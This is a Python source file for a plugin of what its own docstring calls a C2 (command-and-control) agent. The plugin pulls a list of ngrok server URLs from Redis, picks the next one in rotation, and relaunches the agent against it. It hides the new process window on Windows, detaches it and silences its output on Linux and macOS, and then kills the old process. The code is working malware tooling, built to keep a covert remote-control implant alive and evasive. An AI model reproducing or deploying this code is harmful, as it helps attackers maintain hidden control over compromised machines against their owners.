# agent/plugins/rotate_server.py
"""
Plugin de rotación de servidor C2.
Obtiene el siguiente servidor disponible desde Redis y lanza
un nuevo proceso agente conectado a él, luego termina el actual.
Rotación automática cada 90 minutos configurable via Redis.
"""
import os
import sys
import subprocess
import platform
import time
import json
from plugins import BasePlugin

# TTL para marcar rotación en curso (evitar doble rotación)
ROTATION_LOCK_KEY = "agent:rotation:lock"
ROTATION_LOCK_TTL = 30  # segundos


class Plugin(BasePlugin):
    name = "rotate_server"
    description = "Rota la conexión del agente al siguiente servidor disponible en Redis"

    def run(self, args=None):
        """
        Obtiene el siguiente servidor desde Redis y lanza nuevo agente.
        args puede contener el nombre del servidor destino (opcional).
        """
        try:
            import redis as redis_lib

            # Configuración Redis
            redis_host = os.getenv("REDIS_HOST", "192.168.1.55")
            redis_port = int(os.getenv("REDIS_PORT", 6379))

            r = redis_lib.Redis(
                host=redis_host,
                port=redis_port,
                decode_responses=True,
                socket_connect_timeout=5
            )
            r.ping()

            # Obtener servidor actual
            current_server = os.getenv("CURRENT_SERVER", "")

            # Obtener todos los servidores disponibles
            keys = r.keys("server:*:ngrok_url")
            servers = []
            for key in keys:
                server_name = key.split(":")[1]
                url = r.get(key)
                if url and "0.0.0.0" not in url:  # Ignorar IPs locales
                    servers.append({
                        "name": server_name,
                        "url": url.rstrip('/')
                    })

            servers.sort(key=lambda x: x['name'])

            if not servers:
                return "[-] No hay servidores disponibles en Redis"

            # Seleccionar servidor destino
            target_server = None

            if args and args.strip():
                # Buscar servidor específico si se pasó como argumento
                for s in servers:
                    if s['name'] == args.strip():
                        target_server = s
                        break
                if not target_server:
                    return f"[-] Servidor '{args.strip()}' no encontrado. Disponibles: {[s['name'] for s in servers]}"
            else:
                # Seleccionar siguiente servidor en la lista (rotación circular)
                if len(servers) == 1:
                    # Solo hay un servidor, reconectar al mismo
                    target_server = servers[0]
                else:
                    # Encontrar el siguiente al actual
                    current_idx = -1
                    for i, s in enumerate(servers):
                        if s['name'] == current_server:
                            current_idx = i
                            break
                    next_idx = (current_idx + 1) % len(servers)
                    target_server = servers[next_idx]

            output = f"[*] Rotando conexión...\n"
            output += f"[*] Servidor actual: {current_server or 'desconocido'}\n"
            output += f"[*] Servidor destino: {target_server['name']}\n"
            output += f"[*] URL destino: {target_server['url']}\n\n"

            # Verificar lock de rotación (evitar doble rotación)
            if r.exists(ROTATION_LOCK_KEY):
                return output + "[-] Rotación ya en curso, esperando..."

            # Activar lock
            r.setex(ROTATION_LOCK_KEY, ROTATION_LOCK_TTL, "1")

            # Obtener ruta del agente actual
            agent_script = os.path.abspath(
                os.path.join(os.path.dirname(__file__), '..', 'agent_ngrok.py')
            )

            if not os.path.exists(agent_script):
                return output + f"[-] No se encontró agent_ngrok.py en: {agent_script}"

            # Construir comando para nuevo proceso agente
            python_exe = sys.executable

            env = os.environ.copy()
            env["REDIS_HOST"] = redis_host
            env["REDIS_PORT"] = str(redis_port)
            env["CURRENT_SERVER"] = target_server['name']

            if platform.system() == "Windows":
                # Windows: lanzar proceso oculto
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE

                subprocess.Popen(
                    [python_exe, agent_script, target_server['url']],
                    startupinfo=startupinfo,
                    env=env,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                )
            else:
                # Linux / macOS: lanzar en background
                subprocess.Popen(
                    [python_exe, agent_script, target_server['url']],
                    env=env,
                    start_new_session=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

            output += f"[+] Nuevo agente lanzado → {target_server['name']}\n"
            output += f"[+] Conectando a: {target_server['url']}\n"
            output += f"[*] Este proceso terminará en 5 segundos...\n"

            # Registrar en Redis la rotación completada
            r.setex(
                f"agent:last_rotation",
                600,
                json.dumps({
                    "from": current_server,
                    "to": target_server['name'],
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
                })
            )

            # Dar tiempo al nuevo agente para conectarse
            time.sleep(5)

            # Terminar este proceso agente
            output += "[+] Rotación completada. Cerrando proceso actual.\n"
            os._exit(0)  # Terminar proceso actual

            return output

        except ImportError:
            return "[-] Redis no disponible. Instala: pip install redis"
        except Exception as e:
            return f"[-] Error en rotate_server: {str(e)}"
